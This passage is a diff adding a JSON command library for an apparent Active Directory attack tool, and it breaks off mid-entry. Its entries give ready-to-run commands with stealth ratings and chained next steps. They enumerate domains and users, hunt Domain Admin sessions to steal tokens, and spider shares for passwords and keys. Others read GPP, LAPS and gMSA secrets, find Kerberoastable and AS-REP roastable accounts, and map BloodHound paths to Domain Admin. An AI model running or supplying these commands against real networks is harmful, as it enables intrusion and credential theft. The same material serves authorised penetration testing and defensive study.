@@ -1,0 +1,2391 @@
+{
+  "phases": [
+    {
+      "key": "enumeration",
+      "label": "Enumeration",
+      "icon": "🔍",
+      "color": "#00d4ff",
+      "subsections": [
+        {
+          "key": "domain-recon",
+          "label": "Domain Recon",
+          "commands": [
+            {
+              "id": "enum-001",
+              "title": "Domain Info (net)",
+              "tool": "net",
+              "tags": [
+                "builtin",
+                "stealthy",
+                "no-creds"
+              ],
+              "opsec": "low",
+              "description": "Gather basic domain information using built-in Windows commands.",
+              "command": "net user /domain\nnet group /domain\nnet group \"Domain Admins\" /domain\nnet localgroup administrators",
+              "next_steps": [
+                "user-001",
+                "grp-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-002",
+              "title": "Domain Recon (nltest)",
+              "tool": "nltest",
+              "tags": [
+                "builtin",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Enumerate domain controllers and trust relationships.",
+              "command": "nltest /dclist:{DOMAIN}\nnltest /domain_trusts\nnltest /dsgetdc:{DOMAIN}",
+              "next_steps": [
+                "enum-003"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-003",
+              "title": "Domain Info (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Get comprehensive domain information using PowerView.",
+              "command": "Import-Module .\\PowerView.ps1\nGet-Domain\nGet-DomainController\nGet-DomainTrust\nGet-ForestTrust",
+              "next_steps": [
+                "enum-004",
+                "grp-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-004",
+              "title": "Domain Recon (BloodHound)",
+              "tool": "SharpHound",
+              "tags": [
+                "noisy",
+                "requires-creds",
+                "logs-generated"
+              ],
+              "opsec": "high",
+              "description": "Collect all AD data for BloodHound graph analysis.",
+              "command": ".\\SharpHound.exe -c All --zipfilename bloodhound_output\n# OR\nImport-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -Domain {DOMAIN} -ZipFileName bloodhound_data",
+              "next_steps": [
+                "bh-cypher-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-005",
+              "title": "Domain Recon (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Enumerate domain details via CrackMapExec.",
+              "command": "crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --pass-pol\ncrackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M get_user_descriptions",
+              "next_steps": [
+                "user-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-006",
+              "title": "LDAP Query (ldapsearch)",
+              "tool": "ldapsearch",
+              "tags": [
+                "linux",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Query LDAP for domain information directly.",
+              "command": "ldapsearch -x -H ldap://{DC_IP} -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD} -b \"DC={DOMAIN_PART1},DC={DOMAIN_PART2}\" \"(objectClass=domain)\"",
+              "next_steps": [
+                "enum-007"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "enum-007",
+              "title": "dsquery Domain Info",
+              "tool": "dsquery",
+              "tags": [
+                "builtin",
+                "windows",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Use dsquery to enumerate the domain.",
+              "command": "dsquery * -filter \"(objectClass=domain)\" -attr *\ndsquery server -domain {DOMAIN}\ndsquery site",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "user-enum",
+          "label": "User Enumeration",
+          "commands": [
+            {
+              "id": "user-001",
+              "title": "User Enumeration (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Enumerate all domain users and their properties.",
+              "command": "Get-DomainUser | Select-Object samaccountname, description, memberof, lastlogon\nGet-DomainUser -SPN  # Kerberoastable users\nGet-DomainUser -PreauthNotRequired  # AS-REP Roastable\nGet-DomainUser -AdminCount 1  # Protected accounts",
+              "next_steps": [
+                "kerb-001",
+                "asrep-001"
+              ],
+              "admapper_action": {
+                "type": "phase",
+                "endpoint": "/api/enum",
+                "body": {}
+              }
+            },
+            {
+              "id": "user-002",
+              "title": "User Enum (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "no-creds"
+              ],
+              "opsec": "low",
+              "description": "Enumerate users via RID brute force without credentials.",
+              "command": "impacket-samrdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}\nimpacket-lookupsid {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}",
+              "next_steps": [
+                "spray-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "user-003",
+              "title": "User Enum (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Enumerate users via CME with credentials.",
+              "command": "crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --users\ncrackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --rid-brute",
+              "next_steps": [
+                "spray-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "user-004",
+              "title": "Kerb User Enum (no creds)",
+              "tool": "Kerbrute",
+              "tags": [
+                "linux",
+                "no-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Validate usernames against Kerberos without triggering lockouts.",
+              "command": "kerbrute userenum -d {DOMAIN} --dc {DC_IP} usernames.txt\nkerbrute bruteuser -d {DOMAIN} --dc {DC_IP} {TARGET_USER} passwords.txt",
+              "next_steps": [
+                "spray-001",
+                "asrep-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "user-005",
+              "title": "User Description Hunt",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Hunt for passwords stored in user description fields.",
+              "command": "Get-DomainUser | Where-Object {$_.description -ne $null} | Select-Object samaccountname, description\nGet-DomainUser | Where-Object {$_.description -match \"pass|pwd|cred\"} | Select-Object samaccountname, description",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "user-006",
+              "title": "AdminSDHolder Users",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Find protected accounts (AdminCount=1) — high value targets.",
+              "command": "Get-DomainUser -AdminCount 1 | Select-Object samaccountname, memberof\nGet-DomainGroup -AdminCount 1 | Select-Object name, member",
+              "next_steps": [
+                "priv-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "group-enum",
+          "label": "Group Enumeration",
+          "commands": [
+            {
+              "id": "grp-001",
+              "title": "Group Enum (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Enumerate domain groups and their members.",
+              "command": "Get-DomainGroup | Select-Object name, description\nGet-DomainGroupMember -Identity \"Domain Admins\" -Recurse\nGet-DomainGroupMember -Identity \"Enterprise Admins\" -Recurse\nGet-DomainGroupMember -Identity \"Account Operators\" -Recurse",
+              "next_steps": [
+                "user-006"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "grp-002",
+              "title": "Group Enum (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Enumerate groups via CrackMapExec.",
+              "command": "crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --groups\ncrackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -x \"net group 'Domain Admins' /domain\"",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "grp-003",
+              "title": "Local Admin Hunters",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Find machines where a user has local admin rights.",
+              "command": "Find-LocalAdminAccess -Verbose\nInvoke-EnumerateLocalAdmin -Verbose\nGet-NetLocalGroupMember -ComputerName {TARGET_COMPUTER} -GroupName Administrators",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "computer-enum",
+          "label": "Computer Enumeration",
+          "commands": [
+            {
+              "id": "comp-001",
+              "title": "Computer Enum (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Enumerate domain computers with OS and other details.",
+              "command": "Get-DomainComputer | Select-Object name, operatingsystem, dnshostname\nGet-DomainComputer -Unconstrained | Select-Object name, dnshostname  # Unconstrained Delegation!\nGet-DomainComputer -TrustedToAuth | Select-Object name, dnshostname  # Constrained Delegation",
+              "next_steps": [
+                "deleg-001",
+                "deleg-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "comp-002",
+              "title": "Computer Enum (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Discover live hosts and their SMB details.",
+              "command": "crackmapexec smb {DC_IP}/24\ncrackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD}\ncrackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --gen-relay-list relay_targets.txt",
+              "next_steps": [
+                "ntlm-relay-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "comp-003",
+              "title": "Session Hunter",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Find active user sessions on machines — locate Domain Admins.",
+              "command": "Invoke-UserHunter -Verbose\nInvoke-UserHunter -GroupName \"Domain Admins\"\nFind-DomainUserLocation -Verbose",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "access-discovery",
+          "label": "🗝 Access Discovery",
+          "commands": [
+            {
+              "id": "access-001",
+              "title": "Find Local Admin Access",
+              "tool": "PowerView / netexec",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Find every machine where your current credentials have local administrator rights — your lateral movement map.",
+              "command": "# PowerView — where does MY user have local admin?\nFind-LocalAdminAccess -Verbose\n\n# netexec — spray creds and flag (Pwn3d!) where you are admin\nnetexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD}\nnetexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH} | grep Pwn3d\n\n# Who is local admin WHERE (reverse view)\nInvoke-EnumerateLocalAdmin -Verbose",
+              "next_steps": [
+                "lateral-001",
+                "cred-dump-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "access-002",
+              "title": "Hunt Sessions (Find Where Admins Are)",
+              "tool": "PowerView / netexec",
+              "tags": [
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Locate which machines high-value users are logged into — pick a box, steal their token/creds.",
+              "command": "# Where are Domain Admins logged in?\nInvoke-UserHunter -GroupName \"Domain Admins\" -Verbose\nFind-DomainUserLocation -UserGroupIdentity \"Domain Admins\"\n\n# netexec — enumerate logged-on users across the subnet\nnetexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --loggedon-users",
+              "next_steps": [
+                "access-001",
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "access-003",
+              "title": "Find Shares (ShareFinder / Snaffler)",
+              "tool": "PowerView / Snaffler / netexec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Discover readable/writable shares across the domain and hunt them for secrets (passwords, keys, configs).",
+              "command": "# PowerView — find shares you can reach\nInvoke-ShareFinder -CheckShareAccess -Verbose\n\n# netexec — list shares + permissions across the subnet\nnetexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --shares\n\n# Snaffler — auto-hunt shares for juicy files (creds, keys, .config)\n.\\Snaffler.exe -s -d {DOMAIN} -o snaffler.log\n\n# manspider (Linux) — regex-grep all shares for secrets\nmanspider {DC_IP}/24 -u {USERNAME} -p {PASSWORD} -c \"password|pwd|secret\"",
+              "next_steps": [
+                "smb-002",
+                "smb-005"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "access-004",
+              "title": "Find Interesting ACLs",
+              "tool": "PowerView / BloodHound",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Find dangerous rights (GenericAll, WriteDacl, ForceChangePassword, WriteOwner) that low-priv users hold over privileged objects.",
+              "command": "# All interesting ACLs, GUIDs resolved\nFind-InterestingDomainAcl -ResolveGUIDs\n\n# Dangerous rights held by NON-privileged principals only\nGet-DomainObjectAcl -ResolveGUIDs | ? {\n  $_.ActiveDirectoryRights -match \"GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AllExtendedRights\" -and\n  $_.IdentityReference -notmatch \"BUILTIN|Domain Admins|Enterprise Admins|NT AUTHORITY\"\n}\n\n# What can a SPECIFIC user/group do? (replace SID)\nGet-DomainObjectAcl -Identity * -ResolveGUIDs | ? { $_.SecurityIdentifier -eq \"{DOMAIN_SID}-1104\" }",
+              "next_steps": [
+                "acl-001",
+                "acl-002",
+                "bh-cypher-006"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "smb-shares",
+          "label": "Shares & SMB",
+          "commands": [
+            {
+              "id": "smb-001",
+              "title": "SMB Share Enum (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Enumerate accessible SMB shares across the network.",
+              "command": "crackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --shares\ncrackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} --shares",
+              "next_steps": [
+                "smb-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "smb-002",
+              "title": "Spider Shares (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Recursively spider shares for interesting files.",
+              "command": "crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M spider_plus\ncrackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M spider_plus --share SYSVOL",
+              "next_steps": [
+                "gpo-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "smb-003",
+              "title": "SMB Enum (smbclient)",
+              "tool": "smbclient",
+              "tags": [
+                "linux",
+                "no-creds"
+              ],
+              "opsec": "low",
+              "description": "Connect to and enumerate SMB shares.",
+              "command": "smbclient -L //{DC_IP}/ -N\nsmbclient -L //{DC_IP}/ -U {USERNAME}%{PASSWORD}\nsmbclient //{DC_IP}/SYSVOL -U {USERNAME}%{PASSWORD}",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "smb-004",
+              "title": "SMB Enum (enum4linux)",
+              "tool": "enum4linux",
+              "tags": [
+                "linux",
+                "no-creds",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Comprehensive SMB/SAMBA enumeration tool.",
+              "command": "enum4linux -a {DC_IP}\nenum4linux-ng -A {DC_IP} -u {USERNAME} -p {PASSWORD}",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "smb-005",
+              "title": "GPP Passwords (SYSVOL)",
+              "tool": "CME / impacket",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Find Group Policy Preferences passwords in SYSVOL (AES encrypted, decryptable).",
+              "command": "crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_password\ncrackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_autologin\nGet-GPPPassword  # PowerSploit",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "dns-ldap",
+          "label": "DNS / LDAP",
+          "commands": [
+            {
+              "id": "dns-001",
+              "title": "DNS Zone Transfer",
+              "tool": "dig / nslookup",
+              "tags": [
+                "no-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Attempt DNS zone transfer — exposes full network map.",
+              "command": "dig axfr {DOMAIN} @{DC_IP}\nnslookup\nserver {DC_IP}\nls -d {DOMAIN}",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "dns-002",
+              "title": "LDAP Enum (ldapsearch)",
+              "tool": "ldapsearch",
+              "tags": [
+                "linux",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Perform comprehensive LDAP enumeration.",
+              "command": "ldapsearch -x -H ldap://{DC_IP} -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD} -b \"DC=corp,DC=local\" \"(objectCategory=person)(objectClass=user)\" samaccountname\nldapsearch -x -H ldap://{DC_IP} -b \"DC=corp,DC=local\" -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD} \"(objectClass=group)\" cn member",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "dns-003",
+              "title": "LDAP Null Bind",
+              "tool": "ldapsearch",
+              "tags": [
+                "linux",
+                "no-creds"
+              ],
+              "opsec": "low",
+              "description": "Attempt anonymous/null LDAP bind to enumerate without credentials.",
+              "command": "ldapsearch -x -H ldap://{DC_IP} -b \"\" -s base\nldapsearch -x -H ldap://{DC_IP} -b \"DC=corp,DC=local\" \"(objectClass=*)\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "laps",
+          "label": "🔑 LAPS / gMSA",
+          "commands": [
+            {
+              "id": "laps-001",
+              "title": "Read LAPS Passwords",
+              "tool": "netexec / PowerView",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "If you can read ms-Mcs-AdmPwd, you get the local admin password in cleartext.",
+              "command": "# netexec (auto-finds readable LAPS)\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps\n\n# PowerView — who can read LAPS, and the values\nGet-DomainComputer | Select-Object name, ms-mcs-admpwd\n\n# pyLAPS\npython3 pyLAPS.py --action get -d {DOMAIN} -u {USERNAME} -p {PASSWORD}",
+              "next_steps": [
+                "pth-001",
+                "lateral-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "gmsa-001",
+              "title": "Read gMSA Password (Golden gMSA)",
+              "tool": "gMSADumper / netexec",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Retrieve the managed password blob of a gMSA and derive its NT hash.",
+              "command": "# gMSADumper\npython3 gMSADumper.py -u {USERNAME} -p {PASSWORD} -d {DOMAIN}\n\n# netexec\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --gmsa",
+              "next_steps": [
+                "pth-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "find-roasting",
+          "label": "🎯 Find Roasting Targets",
+          "commands": [
+            {
+              "id": "roast-enum-001",
+              "title": "Find AS-REP Roastable Users (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Find all accounts with 'Do Not Require Pre-Authentication' set — AS-REP Roastable.",
+              "command": "# Method 1 - PowerView\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname, pwdlastset\nGet-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname, memberof\n\n# Method 2 - LDAP filter directly\nGet-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\"\n\n# Count vulnerable accounts\n(Get-DomainUser -PreauthNotRequired).count",
+              "next_steps": [
+                "asrep-001",
+                "asrep-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "roast-enum-002",
+              "title": "Find AS-REP Roastable (impacket — no creds)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "no-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Enumerate AS-REP roastable users via LDAP without credentials.",
+              "command": "# With user list (no password needed):\nimpacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {DC_IP}\n\n# With credentials (finds ALL vulnerable accounts):\nimpacket-GetNPUsers {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -format hashcat\n\n# No creds at all (anonymous LDAP):\nimpacket-GetNPUsers {DOMAIN}/ -no-pass -dc-ip {DC_IP}",
+              "next_steps": [
+                "asrep-001",
+                "crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "roast-enum-003",
+              "title": "Find AS-REP Roastable (ldapsearch)",
+              "tool": "ldapsearch",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Query LDAP directly for accounts without Kerberos pre-auth required.",
+              "command": "# UAC flag 4194304 = DONT_REQ_PREAUTH\nldapsearch -x -H ldap://{DC_IP} -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD}   -b \"DC=corp,DC=local\"   \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\"   samaccountname userAccountControl pwdLastSet\n\n# Also combined with disabled check (enabled only):\nldapsearch -x -H ldap://{DC_IP} -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD}   -b \"DC=corp,DC=local\"   \"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\"   samaccountname",
+              "next_steps": [
+                "asrep-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "roast-enum-004",
+              "title": "Find AS-REP Roastable (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Use CME LDAP module to identify AS-REP Roastable accounts.",
+              "command": "crackmapexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --asreproast asrep_output.txt\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --asreproast asrep_output.txt",
+              "next_steps": [
+                "crack-001"
+              ],
+              "admapper_action": {
+                "type": "phase",
+                "endpoint": "/api/asreproast",
+                "body": {}
+              }
+            },
+            {
+              "id": "spn-enum-001",
+              "title": "Find SPN / Kerberoastable Users (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Enumerate all accounts with Service Principal Names set — Kerberoastable.",
+              "command": "# Find all SPN accounts\nGet-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset, admincount\n\n# Detailed SPN view with group membership\nGet-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof | Format-List\n\n# Find high-value SPN accounts (DA members with SPNs — golden targets!)\nGet-DomainUser -SPN -AdminCount 1 | Select-Object samaccountname, serviceprincipalname\n\n# Count\n(Get-DomainUser -SPN).count",
+              "next_steps": [
+                "kerb-001",
+                "kerb-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "spn-enum-002",
+              "title": "Find SPNs (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "List all SPN accounts without requesting tickets (recon only).",
+              "command": "# List SPNs only (no ticket request)\nimpacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP}\n\n# With NTLM hash\nimpacket-GetUserSPNs {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH} -dc-ip {DC_IP}\n\n# Target specific user's SPN\nimpacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request-user {TARGET_USER}",
+              "next_steps": [
+                "kerb-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "spn-enum-003",
+              "title": "Find SPNs (ldapsearch / dsquery)",
+              "tool": "ldapsearch / dsquery",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Query LDAP for SPN accounts — stealthy, no ticket requests.",
+              "command": "# ldapsearch — find all accounts with SPNs\nldapsearch -x -H ldap://{DC_IP} -D \"{USERNAME}@{DOMAIN}\" -w {PASSWORD}   -b \"DC=corp,DC=local\"   \"(&(objectClass=user)(servicePrincipalName=*))\"   samaccountname servicePrincipalName\n\n# dsquery (Windows)\ndsquery * -filter \"(&(objectCategory=user)(servicePrincipalName=*))\" -attr samaccountname servicePrincipalName",
+              "next_steps": [
+                "kerb-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "spn-enum-004",
+              "title": "Find SPNs (CME LDAP)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Use CME/NetExec LDAP to enumerate Kerberoastable accounts.",
+              "command": "crackmapexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --kerberoasting kerb_output.txt\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --kerberoasting kerb_output.txt",
+              "next_steps": [
+                "kerb-crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "spn-enum-005",
+              "title": "Find SPNs (Rubeus — recon only)",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "List Kerberoastable users without requesting any tickets (recon mode).",
+              "command": "# List only — no ticket request\n.\\Rubeus.exe kerberoast /stats\n\n# Find accounts using specific encryption (RC4 = easier to crack)\n.\\Rubeus.exe kerberoast /stats /rc4opsec",
+              "next_steps": [
+                "kerb-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "combined-roast-001",
+              "title": "Both Roasting Targets at Once",
+              "tool": "PowerView / impacket",
+              "tags": [
+                "powershell",
+                "high-value",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "One-shot: find ALL AS-REP + Kerberoastable users simultaneously.",
+              "command": "# PowerView — full picture\nWrite-Host \"=== AS-REP ROASTABLE ===\" -ForegroundColor Red\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname, admincount\n\nWrite-Host \"=== KERBEROASTABLE (SPN) ===\" -ForegroundColor Yellow\nGet-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount\n\nWrite-Host \"=== HIGH VALUE: DA members in both ===\" -ForegroundColor Magenta\nGet-DomainUser -SPN -AdminCount 1 | Select-Object samaccountname\nGet-DomainUser -PreauthNotRequired -AdminCount 1 | Select-Object samaccountname",
+              "next_steps": [
+                "asrep-001",
+                "kerb-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "bloodhound-queries",
+          "label": "🩸 BloodHound Cypher",
+          "commands": [
+            {
+              "id": "bh-cypher-001",
+              "title": "Shortest Path to Domain Admin",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Find the shortest path from ANY user to Domain Admin group.",
+              "command": "// Shortest path from any owned user to DA\nMATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group))\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN p\n\n// All shortest paths to DA (not just owned)\nMATCH p=shortestPath((u:User)-[*1..]->(g:Group))\nWHERE g.name =~ \"(?i)domain admins.*\"\nAND u.name <> g.name\nRETURN p LIMIT 10\n\n// Shortest path from specific user\nMATCH p=shortestPath((u:User {name:\"{USERNAME}@{DOMAIN}\"})-[*1..]->(g:Group {name:\"DOMAIN ADMINS@{DOMAIN}\"}))\nRETURN p",
+              "next_steps": [
+                "acl-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-002",
+              "title": "Find AS-REP Roastable Users",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "asrep",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Query BloodHound for all accounts with pre-auth not required.",
+              "command": "// All AS-REP roastable accounts\nMATCH (u:User {dontreqpreauth:true, enabled:true})\nRETURN u.name, u.pwdlastset, u.admincount\nORDER BY u.admincount DESC\n\n// AS-REP roastable with path to DA\nMATCH p=shortestPath((u:User {dontreqpreauth:true, enabled:true})-[*1..]->(g:Group))\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN p\n\n// AS-REP roastable that are admins (CRITICAL!)\nMATCH (u:User {dontreqpreauth:true, enabled:true, admincount:true})\nRETURN u.name ORDER BY u.name",
+              "next_steps": [
+                "asrep-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-003",
+              "title": "Find Kerberoastable Users (SPNs)",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "kerberoasting",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Query BloodHound for all SPN accounts — Kerberoastable targets.",
